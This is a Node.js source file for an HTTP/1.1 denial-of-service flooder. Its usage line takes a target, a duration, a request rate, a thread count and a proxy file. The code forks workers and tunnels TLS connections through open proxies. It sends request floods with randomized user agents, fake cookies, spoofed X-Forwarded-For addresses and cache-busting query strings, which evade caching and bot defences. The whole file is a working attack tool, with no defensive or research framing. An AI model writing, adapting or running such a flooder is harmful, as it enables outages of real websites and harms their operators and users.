//http1.1 raw flood highrps
const net = require("net");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () { });

if (process.argv.length < 7) {
    console.log(`node tlshttp1.js target time rate threads proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomString(len) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let out = "";
    for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
    return out;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.youtube.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    `https://${parsedTarget.host}/`
];

const cacheControls = [
    "no-cache",
    "no-store",
    "max-age=0",
    "must-revalidate",
    "private",
    "public"
];

const pragmas = ["no-cache", "akamai-x-cache-on", "x-dns-prefetch-control"];

const dnts = ["0", "1"];

const upgradeInsecureRequests = ["1"];

const cookies = () => `sessionid=${randomString(32)}; user=${randomString(16)}; _ga=${randomString(20)}`;

const xForwardedFors = () => `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`;

const Header = new class {
    HTTP(options, callback) {
        const payload =
            `CONNECT ${options.address} HTTP/1.1\r\n` +
            `Host: ${options.address}\r\n` +
            `Connection: keep-alive\r\n\r\n`;

        const conn = net.connect({
            host: options.host,
            port: options.port
        });

        conn.setTimeout(10000);
        conn.setKeepAlive(true, 60000);

        conn.on("connect", () => conn.write(payload));

        conn.on("data", chunk => {
            if (chunk.toString().includes("200")) {
                callback(conn, null);
            } else {
                conn.destroy();
                callback(null, "error");
            }
        });

        conn.on("error", () => {
            conn.destroy();
            callback(null, "error");
        });
        
        conn.on("timeout", () => {
            conn.destroy();
            callback(null, "error");
        });
    }
};

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

function buildHeaders() {
    const rand = randomString(10);
    const path = parsedTarget.path ? parsedTarget.path : "/";
    const randomUA = randomElement(useragents);
    const randomLang = randomElement(languages);
    const randomReferer = randomElement(referers);
    const randomCache = randomElement(cacheControls);
    const randomPragma = randomElement(pragmas);
    const randomDNT = randomElement(dnts);
    const randomCookie = cookies();
    const randomXFF = xForwardedFors();
    const randomFetchSite = randomElement(fetch_site);
    const randomFetchMode = randomElement(fetch_mode);
    const randomFetchDest = randomElement(fetch_dest);

    const headers = {
        "Host": parsedTarget.host,
        "User-Agent": randomUA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": randomLang,
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": randomReferer,
        "Cache-Control": randomCache,
        "Pragma": randomPragma,
        "DNT": randomDNT,
        "Upgrade-Insecure-Requests": randomElement(upgradeInsecureRequests),
        "Cookie": randomCookie,
        "X-Forwarded-For": randomXFF,
        "sec-fetch-site": randomFetchSite,
        "sec-fetch-mode": randomFetchMode,
        "sec-fetch-dest": randomFetchDest,
        "Connection": "keep-alive"
    };

    return { path: `${path}?r=${rand}`, headers };
}

function buildRequest(pathAndHeaders) {
    let req = `GET ${pathAndHeaders.path} HTTP/1.1\r\n`;
    for (const [key, value] of Object.entries(pathAndHeaders.headers)) {
        req += `${key}: ${value}\r\n`;
    }
    req += `\r\n`;
    return req;
}

function runFlooder() {
    const proxy = randomElement(proxies);
    if (!proxy || !proxy.includes(":")) return;

    const [phost, pport] = proxy.split(":");

    Header.HTTP({
        host: phost,
        port: pport,
        address: parsedTarget.host + ":443"
    }, (connection, error) => {
        if (error) return;

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ALPNProtocols: ["http/1.1"]
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        let IntervalAttack = null;

        tlsConn.on("secureConnect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    try {
                        const pathAndHeaders = buildHeaders(); // Генерируем уникальные headers для каждого запроса
                        const req = buildRequest(pathAndHeaders);
                        if (tlsConn.writable) {
                            tlsConn.write(req);
                        }
                    } catch (e) {
                        tlsConn.destroy();
                        connection.destroy();
                        if (IntervalAttack) clearInterval(IntervalAttack);
                        return;
                    }
                }
            }, 1000);
        });

        tlsConn.on("close", () => {
            tlsConn.destroy();
            connection.destroy();
            if (IntervalAttack) clearInterval(IntervalAttack);
            return;
        });

        tlsConn.on("error", (err) => {
            tlsConn.destroy();
            connection.destroy();
            if (IntervalAttack) clearInterval(IntervalAttack);
            return;
        });

        tlsConn.on("timeout", () => {
            tlsConn.destroy();
            connection.destroy();
            if (IntervalAttack) clearInterval(IntervalAttack);
            return;
        });

        tlsConn.on("end", () => {
            tlsConn.destroy();
            connection.destroy();
            if (IntervalAttack) clearInterval(IntervalAttack);
            return;
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);